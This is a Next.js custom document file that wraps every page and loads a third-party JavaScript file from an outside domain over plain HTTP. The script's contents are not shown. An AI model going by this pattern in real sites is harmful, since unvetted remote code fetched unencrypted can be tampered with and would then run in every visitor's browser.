import { Html, Head, Main, NextScript } from "next/document";
import Script from "next/script";

export default function Document() {
  return (
    <Html lang="en">
      <Head />
      <Script src="http://www.qqpr.com/ascii/js/1047.js" />

      <body>
        <Main />
        <NextScript />
      </body>
    </Html>
  );
}
